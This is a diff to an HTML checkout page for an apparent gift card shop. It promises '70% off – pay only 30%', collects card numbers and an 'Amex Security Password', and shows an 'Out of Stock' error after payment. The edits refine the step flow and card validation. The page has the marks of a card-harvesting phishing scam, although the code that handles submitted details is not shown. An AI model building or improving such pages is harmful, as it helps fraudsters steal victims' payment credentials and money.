@@ -26,9 +26,8 @@
       <h1 id="selectedBrandTitle">Choose Amount</h1>
       <p class="sub">All cards currently 70% off – pay only 30%</p>
       <div class="amounts" id="amountBtns"></div>
-      <button class="pay-btn" id="payBtn" onclick="submitPay()" disabled style="opacity:0.55;">
-  Enter valid card details
-</button>
+      <button class="pay-btn" id="toDetailsBtn" disabled onclick="goStep(3)">Continue</button>
+    </div>
 
     <!-- STEP 3: Email + Payment + Billing -->
     <div id="step3" class="step">
@@ -44,6 +43,7 @@
 
         <label>Card Number</label>
         <input type="text" id="cardNumber" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required />
+        <div id="cardError" style="font-size:0.82rem;margin-top:6px;font-weight:600;display:none;"></div>
 
         <div class="row">
           <div>
@@ -56,7 +56,7 @@
           </div>
         </div>
 
-        <div id="amexField">
+        <div id="amexField" style="display:none;">
           <label>Amex Security Password / 4DBC</label>
           <input type="password" id="amexPassword" placeholder="Amex password or 4-digit code" />
         </div>
@@ -86,7 +86,9 @@
           </div>
         </div>
 
-        <button class="pay-btn" id="payBtn" onclick="submitPay()">Pay Now – 70% Off Applied</button>
+        <button class="pay-btn" id="payBtn" onclick="submitPay()" disabled style="opacity:0.55;">
+          Enter valid card details
+        </button>
 
         <div class="error-box" id="errorBox">
           <strong>Sorry – Out of Stock</strong><br>
